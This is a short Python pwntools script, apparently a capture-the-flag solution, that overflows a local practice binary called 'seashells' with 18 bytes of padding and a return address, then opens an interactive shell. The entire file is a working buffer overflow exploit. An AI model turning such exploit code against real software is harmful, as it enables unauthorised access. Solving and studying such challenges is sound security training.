#!/usr/bin/env python3

from pwn import *

def main():
	io = process('seashells')

	padding = b'a' * 18
	syscall = p64(0x4006e3)

	payload = padding + syscall

	io.recvuntil('Would you like a shell?')
	io.sendline(payload)
	io.interactive()


if __name__ == '__main__':
	main()
